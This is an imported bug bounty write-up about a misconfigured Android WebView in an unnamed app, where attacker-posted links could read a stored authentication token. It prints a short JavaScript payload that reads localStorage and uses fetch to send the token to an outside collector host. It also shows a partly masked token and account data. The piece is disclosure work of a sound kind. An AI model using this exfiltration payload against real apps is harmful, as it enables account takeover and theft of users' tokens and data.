---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-04-08_steal-authentication-token-with-one-click-on-misconfigured-webview.md
original_filename: 2023-04-08_steal-authentication-token-with-one-click-on-misconfigured-webview.md
title: Steal authentication token with one-click on misconfigured WebView.
category: documents
detected_topics:
- jwt
- xss
- command-injection
- otp
- cors
- mobile-security
tags:
- imported
- documents
- jwt
- xss
- command-injection
- otp
- cors
- mobile-security
language: en
raw_sha256: 674cc52f33b4355b049d3613981916a1a5a6c8532ec97c50a6f2d18a10d8883a
text_sha256: 48745d44d46a4ffb89d20237b60aeec825f85df3c2f3d725ff1d1a0d4b7c8e3d
ingested_at: '2026-06-28T07:32:20Z'
sensitivity: unknown
redactions_applied: false
---

# Steal authentication token with one-click on misconfigured WebView.

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-04-08_steal-authentication-token-with-one-click-on-misconfigured-webview.md
- Source Type: markdown
- Detected Topics: jwt, xss, command-injection, otp, cors, mobile-security
- Ingested At: 2026-06-28T07:32:20Z
- Redactions Applied: False
- Raw SHA256: `674cc52f33b4355b049d3613981916a1a5a6c8532ec97c50a6f2d18a10d8883a`
- Text SHA256: `48745d44d46a4ffb89d20237b60aeec825f85df3c2f3d725ff1d1a0d4b7c8e3d`


## Content

---
title: "Steal authentication token with one-click on misconfigured WebView."
url: "https://0xwise.medium.com/are-clicking-links-safe-f7cfcae2e421"
authors: ["Kerolos A. Saber (@0xWise)"]
bugs: ["Android", "Webview", "Account takeover"]
bounty: "3,000"
publication_date: "2023-04-08"
added_date: "2023-04-24"
source: "pentester.land/writeups.json"
original_index: 1286
scraped_via: "browseros"
---

# Steal authentication token with one-click on misconfigured WebView.

Steal authentication token with one-click on misconfigured WebView.
Kerolos Atef
Follow
3 min read
·
Apr 8, 2023

55

1

Howdy friend, I hope all is well at your end!

In this write-up, I will discuss an Android WebView attack that I discovered in some of the apps I was testing. Specifically, I will showcase how I was able to achieve a one-click account takeover, including but not limited to a private bug bounty program on HackerOne, by simply posting a message, comment, or post containing a link to my attacker’s website or URL. Once the Android user clicked the link, I, as the attacker, was able to steal their authentication token and their account data.

What is Webview?

WebView is a component that allows developers to customize how web pages are displayed within their apps, including support for JavaScript, cookies, and user input. It also enables the rendering of HTML, CSS, and images, and allows users to interact with web content, such as clicking links and submitting forms. Essentially, it is a browser for app content.

Details:

During my hunt on an Android app in a private bug bounty program on HackerOne, I discovered that while browsing the app, the webview executed following code that stored a user’s authentication token and account data in local storage:

javascript:window.localStorage.setItem("u", JSON.stringify({"oldToken":"Basic NjQwMDE1N2EwMTA4MzI0NTI1Y2NiOWJmOmQ3MDVkZDkzLWRjMGMtNxxxxxxxx","id":"61957b5843xxxxx","email":"secret@myemail.com","username":"0xWise","referralCode":"","hasApiAccount":false,"hasMobileAccount":true,"hasWebAccount":true,"hasPasswordSet":true}));

This code means that the localStorage value for item “u” is equal to the data in the code above. The data in the code has an “oldToken” that is equal to my account’s JWT auth token (note: the token is valid, not old).

The webview activity was set to allow setJavaScriptEnabled(true) and setDomStorageEnabled(true). This means that any link clicked and opened inside the webview can execute JavaScript and access the localStorage and sessionStorage objects without any problems.

Get Kerolos Atef’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

In order to detect and/or exploit this vulnerability, I wrote the following script on my server (used Replit hosting service):

alert(window.localStorage.getItem('u'));
fetch('https://eq8u3apw7h7746qv0l5madalnct3ht5i.oastify.com/log', {
method: 'POST',
mode: 'no-cors',
body:window.localStorage.getItem('u')
});

Afterward, I navigated to the Android app and created a post that contained my Replit server’s URL (e.g. https://xss-redacted.repl.co). When the Android app user or victim clicked on the link, the results were as follows:

Press enter or click to view image in full size
Impact

URLs controlled by the attacker in posts, comments, profile website, etc., can be opened inside the webview, giving the attacker access to steal the user’s data from the local storage. This data includes the user authentication token, leading to an Account Takeover (ATO).

Additionally, this vulnerability can lead to mass accounts takeover, as an attacker can easily spread their exploit URL through posts, comments, etc.

Thank you for reading!
If you have any questions, feel free to DM me on Twitter.
